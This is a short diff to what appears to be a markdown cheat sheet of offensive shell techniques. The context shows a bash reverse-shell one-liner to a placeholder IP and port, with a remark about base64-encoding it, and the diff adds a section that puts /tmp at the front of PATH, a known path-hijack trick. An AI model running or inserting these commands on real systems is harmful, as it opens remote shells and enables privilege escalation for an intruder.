@@ -32,3 +32,8 @@ echo "bash -i >& /dev/tcp/[IP_ADDR]/[PORT] 0>&1" |bash    # base64 encode the ec
 ```
 /proc/cpuinfo
 ```
+
+### PATH
+```
+export PATH=/tmp:$PATH
+```
